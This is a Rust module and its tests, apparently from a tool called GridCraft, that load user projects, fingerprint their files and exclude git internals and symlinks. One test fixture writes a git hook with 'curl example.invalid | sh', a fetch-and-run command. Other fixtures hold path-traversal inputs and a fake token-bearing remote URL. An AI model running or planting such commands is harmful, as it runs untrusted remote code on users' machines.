//! Projects on disk: finding them, reading them, and fingerprinting exactly what they contain.
//!
//! A project is a folder in the user's `projects` folder. Its **fingerprint** is a SHA-256 over
//! every file in it (each file's path, length and bytes, in a fixed order). Trust is given to a
//! fingerprint, so the fingerprint has to cover everything that could ever be served or run:
//! a project containing anything that isn't a plain file or folder (a link, which could point
//! outside it) is not fingerprinted at all, and so can't be trusted.
//!
//! One thing in a project's folder is not part of it: **what git keeps there** (`.git`, at any
//! depth). It changes with almost everything git does, so counted in, a project kept in git
//! would stop being the one that was trusted again and again. It is left out of the files and
//! of the fingerprint, and that holds only together with its other half: nothing in it is ever
//! served, run, built, read out or written through GridCraft (`manifest::inner_path` refuses
//! every path into it).

use std::collections::HashMap;
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, OnceLock, PoisonError, RwLock};

use crate::kit;
use crate::manifest::{self, Manifest};
use crate::sha256::Sha256;

/// The most projects listed from one folder.
pub const MAX_PROJECTS: usize = 500;
/// The most files a project may hold.
pub const MAX_FILES: usize = 2_000;
/// The most bytes a project may hold in all.
pub const MAX_BYTES: u64 = 64 * 1024 * 1024;
/// How deep a project's folders may nest.
const MAX_DEPTH: usize = 16;

/// What keeps a project's files as they were checked for as long as they are being run.
///
/// Whoever runs a project's code holds it shared, from before the trust check until the code
/// has finished; whoever changes the project's files through GridCraft needs it alone, and is
/// refused while it is held. Without it a file could be changed between the check and the
/// moment Python reads it, and what ran would not be what the user trusted.
pub fn in_use(dir: &Path) -> Arc<RwLock<()>> {
    static IN_USE: OnceLock<Mutex<HashMap<PathBuf, Arc<RwLock<()>>>>> = OnceLock::new();
    let mut all = IN_USE.get_or_init(Mutex::default).lock().unwrap_or_else(PoisonError::into_inner);
    all.entry(dir.to_path_buf()).or_default().clone()
}

/// A project as found on disk. It may be broken: then `problem` says how, and it can't be trusted.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Project {
    /// The folder's name. For a sound project it is also the manifest's id.
    pub id: String,
    pub dir: PathBuf,
    pub manifest: Option<Manifest>,
    /// 64 hexadecimal digits over the project's whole contents; `None` when they couldn't be read.
    pub fingerprint: Option<String>,
    /// Every file in it, as paths inside the project with `/` separators, sorted.
    pub files: Vec<String>,
    /// Why it can't be used, in words for the user.
    pub problem: Option<String>,
}

impl Project {
    /// Sound enough to be trusted: a valid manifest and a fingerprint.
    pub fn is_sound(&self) -> bool {
        self.problem.is_none() && self.manifest.is_some() && self.fingerprint.is_some()
    }

    /// The name to show: the manifest's, or the folder's when there is no valid manifest.
    pub fn name(&self) -> &str {
        self.manifest.as_ref().map_or(self.id.as_str(), |m| m.name.as_str())
    }

    /// The text of one of the project's own files, to show it to the person. Only a file in
    /// the project's list, which is what was fingerprinted (so nothing of what git keeps, and
    /// no path that leaves the project); only a plain file; and at most `most` bytes long.
    /// What it holds was written by the project's author: it is text to read, and no more.
    pub fn read_text(&self, path: &str, most: u64) -> Result<String, String> {
        if !self.files.iter().any(|file| file == path) {
            return Err(format!("{path} is not a file of this project."));
        }
        let at = self.dir.join(path);
        let found = fs::symlink_metadata(&at).map_err(|_| format!("{path} is no longer there."))?;
        if !found.is_file() {
            return Err(format!("{path} is not a plain file."));
        }
        if found.len() > most {
            return Err(format!("{path} is {} KB: too long to show here.", found.len().div_ceil(1024)));
        }
        fs::read_to_string(&at).map_err(|_| format!("{path} is not text."))
    }
}

/// Lists a project's files (paths inside it), refusing anything that isn't a plain file or folder.
fn walk(dir: &Path, prefix: &str, depth: usize, files: &mut Vec<(String, u64)>) -> Result<(), String> {
    if depth > MAX_DEPTH {
        return Err(format!("its folders nest more than {MAX_DEPTH} deep"));
    }
    let entries = fs::read_dir(dir).map_err(|e| format!("a folder in it can't be read: {e}"))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("a folder in it can't be read: {e}"))?;
        let name = entry.file_name();
        let Some(name) = name.to_str() else { return Err("it has a file whose name isn't text".into()) };
        // What git keeps is not part of the project, whatever it is (a folder, or the file a
        // worktree has in its place): it is not looked into.
        if manifest::kept_by_git(name) {
            continue;
        }
        let path = if prefix.is_empty() { name.to_string() } else { format!("{prefix}/{name}") };
        // `file_type` doesn't follow links: a link is neither a file nor a folder here.
        let kind = entry.file_type().map_err(|e| format!("{path} can't be read: {e}"))?;
        if kind.is_dir() {
            walk(&entry.path(), &path, depth + 1, files)?;
        } else if kind.is_file() {
            let size = entry.metadata().map_err(|e| format!("{path} can't be read: {e}"))?.len();
            files.push((path, size));
            if files.len() > MAX_FILES {
                return Err(format!("it holds more than {MAX_FILES} files"));
            }
        } else {
            return Err(format!("{path} is a link or a special file, which projects may not contain"));
        }
    }
    Ok(())
}

/// The fingerprint of the listed files: each one's path, length and bytes, in the list's order.
fn fingerprint(dir: &Path, files: &[(String, u64)]) -> Result<String, String> {
    let mut hash = Sha256::new();
    let mut total = 0u64;
    let mut buffer = vec![0u8; 64 * 1024];
    for (path, _) in files {
        let mut file = fs::File::open(dir.join(path)).map_err(|e| format!("{path} can't be read: {e}"))?;
        let mut length = 0u64;
        let mut contents = Sha256::new();
        loop {
            let n = file.read(&mut buffer).map_err(|e| format!("{path} can't be read: {e}"))?;
            if n == 0 {
                break;
            }
            length = length.saturating_add(n as u64);
            total = total.saturating_add(n as u64);
            if total > MAX_BYTES {
                return Err(format!("it holds more than {} MB", MAX_BYTES / (1024 * 1024)));
            }
            contents.update(buffer.get(..n).unwrap_or(&[]));
        }
        // Path, a separator no path can contain, the length as read, then the contents' digest:
        // no two different sets of files can produce the same stream.
        hash.update(path.as_bytes());
        hash.update(&[0]);
        hash.update(&length.to_be_bytes());
        hash.update(&contents.finish());
    }
    Ok(hash.hex())
}

/// Reads the project in `dir`. It never fails: a project that can't be read is returned with its
/// `problem` set.
pub fn load(dir: &Path) -> Project {
    let id = dir.file_name().and_then(|n| n.to_str()).unwrap_or_default().to_string();
    let mut project = Project { id: id.clone(), dir: dir.to_path_buf(), manifest: None, fingerprint: None, files: vec![], problem: None };
    let mut files = Vec::new();
    if let Err(problem) = walk(dir, "", 0, &mut files) {
        project.problem = Some(problem);
        return project;
    }
    files.sort();
    project.files = files.iter().map(|(path, _)| path.clone()).collect();
    match fingerprint(dir, &files) {
        Ok(f) => project.fingerprint = Some(f),
        Err(problem) => {
            project.problem = Some(problem);
            return project;
        }
    }
    // Its manifest: `project.toml`, or the name it had before, where that is all there is.
    let named = match manifest::file_among(files.iter().map(|(path, _)| path.as_str())) {
        Ok(named) => named,
        Err(problem) => {
            project.problem = Some(problem);
            return project;
        }
    };
    let size = files.iter().find(|(path, _)| path == named).map_or(0, |(_, size)| *size);
    if size > manifest::MAX_BYTES {
        project.problem = Some(format!("its {named} is larger than {} KB", manifest::MAX_BYTES / 1024));
        return project;
    }
    let checked =
        fs::read_to_string(dir.join(named)).map_err(|e| format!("its {named} can't be read: {e}")).and_then(|text| manifest::parse(&text, &id));
    match checked {
        Ok(m) => {
            // It has to be a project its kit can have, and what it points at has to be in it.
            // Its kit is one GridCraft is built with, or one loaded beside the projects folder.
            let of_no_kit = kit::check_in(dir.parent().unwrap_or(dir), &m).err();
            let missing_panel = m.panel.as_ref().filter(|entry| !project.files.contains(entry));
            let missing_scripts = m.python.as_ref().filter(|folder| !project.files.iter().any(|f| f.starts_with(&format!("{folder}/"))));
            // What a recipe names to build has to be in it too.
            let unbuildable =
                m.c.as_ref().and_then(|recipe| recipe.sources_among(&project.files).and_then(|_| recipe.includes_among(&project.files)).err());
            if let Some(problem) = of_no_kit.or(unbuildable) {
                project.problem = Some(problem);
            } else if let Some(entry) = missing_panel {
                project.problem = Some(format!("its panel, {entry}, is not in it"));
            } else if let Some(folder) = missing_scripts {
                project.problem = Some(format!("its scripts folder, {folder}, is empty or not in it"));
            }
            project.manifest = Some(m);
        }
        Err(problem) => project.problem = Some(problem),
    }
    project
}

/// Every project in the user's projects folder, by folder name. A folder that isn't there yet holds
/// no projects.
pub fn scan(projects_dir: &Path) -> Vec<Project> {
    let Ok(entries) = fs::read_dir(projects_dir) else { return vec![] };
    let mut dirs: Vec<PathBuf> = entries
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
        .filter(|e| e.file_name().to_str().is_some_and(|n| !n.starts_with('.')))
        .map(|e| e.path())
        .collect();
    dirs.sort();
    dirs.truncate(MAX_PROJECTS);
    dirs.iter().map(|dir| load(dir)).collect()
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    /// A folder of its own for one test, removed when the test ends.
    pub(crate) struct TempDir(pub PathBuf);

    impl TempDir {
        pub(crate) fn new(tag: &str) -> TempDir {
            static NEXT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
            let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let dir = std::env::temp_dir().join(format!("gridcraft-dev-{}-{tag}-{n}", std::process::id()));
            let _ = fs::remove_dir_all(&dir);
            fs::create_dir_all(&dir).unwrap();
            TempDir(dir)
        }

        pub(crate) fn write(&self, path: &str, contents: &str) {
            let file = self.0.join(path);
            fs::create_dir_all(file.parent().unwrap()).unwrap();
            fs::write(file, contents).unwrap();
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    pub(crate) const MANIFEST: &str = "id = \"clean-data\"\nname = \"Clean Data\"\nversion = \"0.1.0\"\npermissions = [\"read\", \"python\"]\n\n[panel]\nentry = \"panel/index.html\"\n\n[python]\nscripts = \"python\"\n";

    /// A sound project in `projects/clean-data`.
    pub(crate) fn sample(t: &TempDir) -> PathBuf {
        t.write("clean-data/project.toml", MANIFEST);
        t.write("clean-data/panel/index.html", "<h1>Clean Data</h1>");
        t.write("clean-data/python/clean.py", "def main(data):\n    return data\n");
        t.0.join("clean-data")
    }

    #[test]
    fn reads_a_project_and_lists_its_files() {
        let t = TempDir::new("read");
        let m = load(&sample(&t));
        assert!(m.is_sound(), "{:?}", m.problem);
        assert_eq!((m.id.as_str(), m.name()), ("clean-data", "Clean Data"));
        assert_eq!(m.files, ["panel/index.html", "project.toml", "python/clean.py"]);
        assert_eq!(m.fingerprint.as_ref().map(String::len), Some(64));
        assert_eq!(scan(&t.0), [m]);
        assert!(scan(&t.0.join("nowhere")).is_empty(), "a folder that isn't there holds no projects");
    }

    #[test]
    fn a_project_made_while_it_was_called_a_module_is_still_read() {
        let t = TempDir::new("legacy");
        // Its manifest has the older name: it is read as it is, and nothing is renamed for it.
        t.write("clean-data/module.toml", MANIFEST);
        t.write("clean-data/panel/index.html", "<h1>Clean Data</h1>");
        t.write("clean-data/python/clean.py", "def main(data):\n    return data\n");
        let before = load(&t.0.join("clean-data"));
        assert!(before.is_sound(), "{:?}", before.problem);
        assert_eq!(
            (before.name(), before.files.as_slice()),
            ("Clean Data", ["module.toml", "panel/index.html", "python/clean.py"].map(String::from).as_slice())
        );
        assert!(t.0.join("clean-data/module.toml").is_file() && !t.0.join("clean-data/project.toml").exists());
        // With both names nobody could tell which one counts: it can't be used until one is gone.
        t.write("clean-data/project.toml", &MANIFEST.replace("0.1.0", "9.9.9"));
        let both = load(&t.0.join("clean-data"));
        assert!(!both.is_sound() && both.manifest.is_none());
        assert!(both.problem.unwrap().contains("both a project.toml and a module.toml"));
        fs::remove_file(t.0.join("clean-data/module.toml")).unwrap();
        let after = load(&t.0.join("clean-data"));
        assert!(after.is_sound() && after.manifest.unwrap().version == "9.9.9");
        // The fingerprint covers the file under the name it has: renaming it is a change.
        assert_ne!(before.fingerprint, after.fingerprint);
    }

    #[test]
    fn the_fingerprint_follows_every_file() {
        let t = TempDir::new("fingerprint");
        let dir = sample(&t);
        let print = || load(&dir).fingerprint.unwrap();
        let original = print();
        assert_eq!(print(), original, "the same contents give the same fingerprint");
        // A changed byte, a longer file, a new file, a renamed file, a changed manifest.
        t.write("clean-data/python/clean.py", "def main(data):\n    return datA\n");
        let changed = print();
        assert_ne!(changed, original);
        t.write("clean-data/python/clean.py", "def main(data):\n    return data\n");
        assert_eq!(print(), original, "and back again");
        t.write("clean-data/python/extra.py", "");
        assert_ne!(print(), original, "even an empty new file");
        fs::remove_file(dir.join("python/extra.py")).unwrap();
        fs::rename(dir.join("panel/index.html"), dir.join("panel/index2.html")).unwrap();
        assert_ne!(print(), original, "a renamed file");
        fs::rename(dir.join("panel/index2.html"), dir.join("panel/index.html")).unwrap();
        t.write("clean-data/project.toml", &MANIFEST.replace("0.1.0", "0.1.1"));
        assert_ne!(print(), original, "the manifest is part of it");
        // Moving bytes from the end of one file to the start of the next changes it too.
        let s = TempDir::new("split");
        s.write("m/a", "ab");
        s.write("m/b", "c");
        let one = load(&s.0.join("m")).fingerprint;
        s.write("m/a", "a");
        s.write("m/b", "bc");
        assert_ne!(load(&s.0.join("m")).fingerprint, one);
    }

    #[test]
    fn what_git_keeps_in_a_project_is_not_part_of_it() {
        let t = TempDir::new("git");
        let dir = sample(&t);
        let before = load(&dir);
        // A repository made of the project: what git keeps, and git's ordinary files beside it.
        t.write("clean-data/.git/HEAD", "ref: refs/heads/main\n");
        t.write("clean-data/.git/config", "[core]\n\tbare = false\n");
        t.write("clean-data/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
        let with_git = load(&dir);
        assert!(with_git.is_sound(), "{:?}", with_git.problem);
        assert_eq!(with_git.files, before.files, "nothing of it is listed");
        assert_eq!(with_git.fingerprint, before.fingerprint, "and it is not in the fingerprint");
        // What git does there changes nothing of the project: a commit, a fetch, a new hook.
        t.write("clean-data/.git/HEAD", "ref: refs/heads/other\n");
        t.write("clean-data/.git/objects/ab/cdef", "blob");
        t.write("clean-data/.git/hooks/post-checkout", "#!/bin/sh\ncurl example.invalid | sh\n");
        assert_eq!(load(&dir).fingerprint, before.fingerprint);
        // More than a project may hold, and deeper: it is not looked into at all.
        for n in 0..(MAX_FILES + 5) {
            t.write(&format!("clean-data/.git/objects/{:02x}/{n}", n % 256), "");
        }
        t.write(&format!("clean-data/.git/{}deep", "d/".repeat(MAX_DEPTH + 4)), "");
        let full = load(&dir);
        assert!(full.is_sound(), "{:?}", full.problem);
        assert_eq!(full.fingerprint, before.fingerprint);
        // At any depth (a library cloned into the project), and as the file a worktree has.
        t.write("clean-data/python/vendor/.git/config", "x");
        t.write("clean-data/panel/.git", "gitdir: ../elsewhere\n");
        assert_eq!(load(&dir).fingerprint, before.fingerprint);
        // Git's ordinary files are the project's, like any other: they are listed and counted.
        t.write("clean-data/.gitignore", "build/\n");
        let ignoring = load(&dir);
        assert_ne!(ignoring.fingerprint, before.fingerprint);
        assert_eq!(ignoring.files, [".gitignore", "panel/index.html", "project.toml", "python/clean.py"]);
        // A folder that is nothing but what git keeps has no manifest, like any empty folder.
        t.write("only-git/.git/HEAD", "x");
        let only = load(&t.0.join("only-git"));
        assert!(!only.is_sound() && only.files.is_empty() && only.problem.unwrap().contains("project.toml"));
    }

    #[test]
    fn only_a_projects_own_files_are_read_out_as_text_and_only_so_much() {
        let t = TempDir::new("read-text");
        let dir = sample(&t);
        t.write("clean-data/.git/config", "[remote]\n\turl = https://user:secret-token@example.invalid/x.git\n");
        std::fs::write(dir.join("panel/picture.bin"), [0u8, 159, 146, 150, 255]).unwrap();
        std::fs::write(t.0.join("outside.txt"), "not the project's").unwrap();
        let m = load(&dir);
        assert!(m.is_sound(), "{:?}", m.problem);
        assert_eq!(m.read_text("python/clean.py", 1_000).unwrap(), std::fs::read_to_string(dir.join("python/clean.py")).unwrap());
        // Not what is outside it, by any spelling, nor what git keeps in it.
        for path in [
            "../outside.txt",
            "python/../../outside.txt",
            "/outside.txt",
            ".git/config",
            ".GIT/config",
            "python",
            "",
            "nowhere.py",
            "python\\clean.py",
        ] {
            let refused = m.read_text(path, 1_000).unwrap_err();
            assert!(refused.ends_with("is not a file of this project."), "{path}: {refused}");
        }
        // Not what is no text, and not more than was asked for.
        assert_eq!(m.read_text("panel/picture.bin", 1_000).unwrap_err(), "panel/picture.bin is not text.");
        let long = m.read_text("python/clean.py", 3).unwrap_err();
        assert!(long.starts_with("python/clean.py is 1 KB: too long"), "{long}");
        // A file that went since the project was read is said to be gone.
        std::fs::remove_file(dir.join("python/clean.py")).unwrap();
        assert_eq!(m.read_text("python/clean.py", 1_000).unwrap_err(), "python/clean.py is no longer there.");
    }

    #[test]
    fn a_project_is_one_its_kit_can_have() {
        let t = TempDir::new("kits");
        // A project of the C kit: a manifest and its sources.
        t.write("blink/project.toml", "id = \"blink\"\nname = \"Blink\"\nversion = \"1\"\nkit = \"c\"\npermissions = [\"write\"]\n");
        t.write("blink/src/main.c", "int main(void) { return 0; }\n");
        let blink = load(&t.0.join("blink"));
        assert!(blink.is_sound(), "{:?}", blink.problem);
        assert_eq!(blink.manifest.as_ref().unwrap().kit, "c");
        assert_eq!(blink.files, ["project.toml", "src/main.c"]);
        // What the first kit runs is not a C project's to have: it can't be used, so can't be trusted.
        t.write(
            "sly/project.toml",
            "id = \"sly\"\nname = \"Sly\"\nversion = \"1\"\nkit = \"c\"\npermissions = [\"python\"]\n\n[python]\nscripts = \"python\"\n",
        );
        t.write("sly/python/run.py", "def main(data):\n    return 1\n");
        let sly = load(&t.0.join("sly"));
        assert!(!sly.is_sound());
        assert_eq!(sly.problem.as_deref(), Some("it asks for \"python\", which a project of the C Development Kit can't be given"));
        t.write(
            "paneled/project.toml",
            "id = \"paneled\"\nname = \"Paneled\"\nversion = \"1\"\nkit = \"c\"\n\n[panel]\nentry = \"panel/index.html\"\n",
        );
        t.write("paneled/panel/index.html", "<h1>x</h1>");
        // A panel is a C project's to have: it is where the program built from it runs.
        let paneled = load(&t.0.join("paneled"));
        assert!(paneled.is_sound(), "{:?}", paneled.problem);
        assert_eq!(paneled.manifest.as_ref().unwrap().panel.as_deref(), Some("panel/index.html"));
        // A recipe that names what is not in the project: it can't be used either.
        t.write(
            "gone/project.toml",
            "id = \"gone\"\nname = \"Gone\"\nversion = \"1\"\nkit = \"c\"\n\n[c]\nsources = [\"src/main.c\"]\ninclude = [\"include\"]\n",
        );
        assert_eq!(load(&t.0.join("gone")).problem.as_deref(), Some("its source, src/main.c, is not in it"));
        t.write("gone/src/main.c", "int main(void) { return 0; }\n");
        assert_eq!(load(&t.0.join("gone")).problem.as_deref(), Some("its include folder, include, is not in it"));
        t.write("gone/include/x.h", "");
        let whole = load(&t.0.join("gone"));
        assert!(whole.is_sound(), "{:?}", whole.problem);
        assert_eq!(whole.manifest.unwrap().c.unwrap().sources_among(&whole.files).unwrap(), ["src/main.c"]);
        // A kit this build doesn't have: the project is listed, and says so.
        t.write("rusty/project.toml", "id = \"rusty\"\nname = \"Rusty\"\nversion = \"1\"\nkit = \"rust\"\n");
        let rusty = load(&t.0.join("rusty"));
        assert!(!rusty.is_sound() && rusty.manifest.is_some() && rusty.fingerprint.is_some());
        assert_eq!(rusty.problem.as_deref(), Some("it is a project of the kit \"rust\", which this GridCraft doesn't have: it is not loaded"));
        // Naming the first kit is the same as naming none: here by the id it had before it was named.
        t.write("clean-data/project.toml", &format!("kit = \"anie\"\n{MANIFEST}"));
        t.write("clean-data/panel/index.html", "<h1>Clean Data</h1>");
        t.write("clean-data/python/clean.py", "def main(data):\n    return data\n");
        assert!(load(&t.0.join("clean-data")).is_sound());
    }

    #[test]
    fn a_broken_project_says_what_is_wrong_and_is_not_sound() {
        let t = TempDir::new("broken");
        t.write("no-manifest/panel/index.html", "x");
        t.write("bad-manifest/project.toml", "id = [");
        t.write("wrong-id/project.toml", &MANIFEST.replace("[panel]\nentry = \"panel/index.html\"\n\n[python]\nscripts = \"python\"\n", ""));
        t.write("no-panel/project.toml", &MANIFEST.replace("clean-data", "no-panel").replace("[python]\nscripts = \"python\"\n", ""));
        t.write("no-scripts/project.toml", &MANIFEST.replace("clean-data", "no-scripts"));
        t.write("no-scripts/panel/index.html", "x");
        t.write(".hidden/project.toml", MANIFEST);
        t.write("just-a-file.txt", "not a project");
        let found = scan(&t.0);
        let ids: Vec<&str> = found.iter().map(|m| m.id.as_str()).collect();
        assert_eq!(ids, ["bad-manifest", "no-manifest", "no-panel", "no-scripts", "wrong-id"], "folders only, hidden ones skipped, sorted");
        for m in &found {
            assert!(!m.is_sound() && m.problem.as_ref().is_some_and(|p| !p.is_empty()), "{}: {:?}", m.id, m.problem);
        }
        let problem = |id: &str| found.iter().find(|m| m.id == id).and_then(|m| m.problem.clone()).unwrap();
        assert!(problem("no-manifest").contains("project.toml"));
        assert!(problem("wrong-id").contains("folder"));
        assert!(problem("no-panel").contains("panel/index.html"));
        assert!(problem("no-scripts").contains("scripts folder"));
    }

    #[cfg(unix)]
    #[test]
    fn a_project_containing_a_link_is_refused() {
        let t = TempDir::new("link");
        let dir = sample(&t);
        t.write("outside.py", "import os");
        std::os::unix::fs::symlink(t.0.join("outside.py"), dir.join("python/outside.py")).unwrap();
        let m = load(&dir);
        assert!(!m.is_sound() && m.fingerprint.is_none());
        assert!(m.problem.unwrap().contains("link"));
    }
}
